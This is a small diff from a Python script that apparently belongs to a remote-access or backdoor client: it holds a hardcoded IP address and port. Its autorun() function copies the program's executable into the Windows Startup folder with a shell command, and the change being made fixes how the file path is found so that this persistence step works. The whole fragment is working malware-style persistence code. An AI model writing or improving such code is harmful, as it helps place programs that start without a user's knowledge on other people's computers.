@@ -8,7 +8,7 @@ IP = '192.168.0.101'
 PORT = 3333
 
 def autorun():
-    filename = os.path.basename(__file__)
+    filename = os.path.abspath(__file__)
     exe_filename = filename.replace(".py", ".exe")
     print(filename)
     os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programas\\StartUp\"".format(exe_filename))
